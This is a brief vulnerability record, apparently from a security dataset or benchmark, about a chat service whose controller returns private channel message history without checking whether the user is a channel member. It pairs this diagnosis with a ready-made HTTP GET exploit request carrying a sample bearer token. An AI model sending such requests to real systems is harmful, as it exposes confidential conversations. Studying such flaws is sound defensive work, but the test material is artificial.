diagnosis: The reactive chat controller streams channel message history for any channel ID provided in the path variable without checking if the authenticated user is an invited member of the private channel. Employees can view confidential direct message threads between coworkers.
exploit_request:
GET /chat/channels/priv-chan-8841/messages HTTP/1.1
Host: teamchat.reactive.org
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzkwMDkifQ.signature
